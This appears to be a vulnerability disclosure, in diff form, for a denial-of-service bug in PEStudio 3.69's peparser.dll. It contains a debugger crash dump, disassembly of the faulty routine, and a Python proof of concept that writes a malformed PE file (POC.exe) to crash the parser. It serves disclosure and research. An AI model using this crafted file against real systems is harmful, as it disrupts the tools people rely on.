@@ -1,0 +1,92 @@
+# Title: PEStudio Version 3.69 Denial of Service
+# Date: 5th June 2013
+# Author: Debasish Mandal ( https://twitter.com/debasishm89 )
+# Blog : http://www.debasish.in/
+# Software Homepage: http://www.winitor.com/
+# Version: PEStudio Version 3.69
+# Tested on: Windows XP SP2 / Windows 7
+# Vendor Patch : Recently released stable version (v6.91) is not affected.
+
+'''
+ 
+[+] Affected Module : peparser.dll version 3.69
+ 
+[+] Crash Point:
+ 
+(6b4.17c): Access violation - code c0000005 (!!! second chance !!!)
+eax=00000000 ebx=41414141 ecx=013f41d9 edx=013f0080 esi=00000000 edi=00004141
+eip=3001ce70 esp=0012d15c ebp=00a26100 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000206
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Documents and Settings\debasish mandal\Desktop\Tools\PeStudio369\PeParser.dll - 
+PeParser!PeParser::IPeParserFactory::Destroy+0xf1d0:
+3001ce70 8b510c          mov     edx,dword ptr [ecx+0Ch] ds:0023:013f41e5=????????
+0:000> u eip
+PeParser!PeParser::IPeParserFactory::Destroy+0xf1d0:
+3001ce70 8b510c          mov     edx,dword ptr [ecx+0Ch]
+3001ce73 3bda            cmp     ebx,edx
+3001ce75 7209            jb      PeParser!PeParser::IPeParserFactory::Destroy+0xf1e0 (3001ce80)
+3001ce77 8b6908          mov     ebp,dword ptr [ecx+8]
+3001ce7a 03ea            add     ebp,edx
+3001ce7c 3bdd            cmp     ebx,ebp
+3001ce7e 720c            jb      PeParser!PeParser::IPeParserFactory::Destroy+0xf1ec (3001ce8c)
+3001ce80 46              inc     esi
+ 
+[+] IDA Pro Snap of the Buggy Function:(Code from peparser.dll version 3.69)
+
+.text:3001CE40 sub_3001CE40    proc near               ; CODE XREF: sub_30003510+154p
+.text:3001CE40                                         ; sub_300184D0+4Bp
+.text:3001CE40                 mov     ecx, [ecx+4]
+.text:3001CE43                 xor     eax, eax
+.text:3001CE45                 test    ecx, ecx
+.text:3001CE47                 jz      short locret_3001CE91
+.text:3001CE49                 mov     edx, [ecx+1Ch]
+.text:3001CE4C                 movzx   ecx, word ptr [edx+14h]
+.text:3001CE50                 lea     ecx, [ecx+edx+18h]
+.text:3001CE54                 test    ecx, ecx
+.text:3001CE56                 jz      short locret_3001CE91
+.text:3001CE58                 test    ebx, ebx
+.text:3001CE5A                 jz      short locret_3001CE91
+.text:3001CE5C                 push    esi
+.text:3001CE5D                 push    edi
+.text:3001CE5E                 movzx   edi, word ptr [edx+6]
+.text:3001CE62                 xor     esi, esi
+.text:3001CE64                 test    edi, edi
+.text:3001CE66                 jle     short loc_3001CE8F
+.text:3001CE68                 push    ebp
+.text:3001CE69                 lea     esp, [esp+0]
+.text:3001CE70
+.text:3001CE70 loc_3001CE70:                           ; CODE XREF: sub_3001CE40+46j
+.text:3001CE70                 mov     edx, [ecx+0Ch]    <-- Crash
+.text:3001CE73                 cmp     ebx, edx
+.text:3001CE75                 jb      short loc_3001CE80
+.text:3001CE77                 mov     ebp, [ecx+8]
+.text:3001CE7A                 add     ebp, edx
+.text:3001CE7C                 cmp     ebx, ebp
+.text:3001CE7E                 jb      short loc_3001CE8C
+.text:3001CE80
+.text:3001CE80 loc_3001CE80:                           ; CODE XREF: sub_3001CE40+35j
+.text:3001CE80                 inc     esi
+.text:3001CE81                 add     ecx, 28h
+.text:3001CE84                 cmp     esi, edi
+.text:3001CE86                 jl      short loc_3001CE70
+.text:3001CE88                 pop     ebp
+.text:3001CE89                 pop     edi
+.text:3001CE8A                 pop     esi
+.text:3001CE8B                 retn
+.text:3001CE8C ; ---------------------------------------------------------------------------
+
+[+] Proof of Concept :
+
+'''
+# /usr/bin/python
+header = "MZ"
+header += "A"*58
+header += "\x80\x00\x00\x00"
+header += "A"*3
+header += "\x0e"
+header += "A"*60
+header += "PE"
+header += "A"*235
+f = open('POC.exe','wb')
+f.write(header)
+f.close()
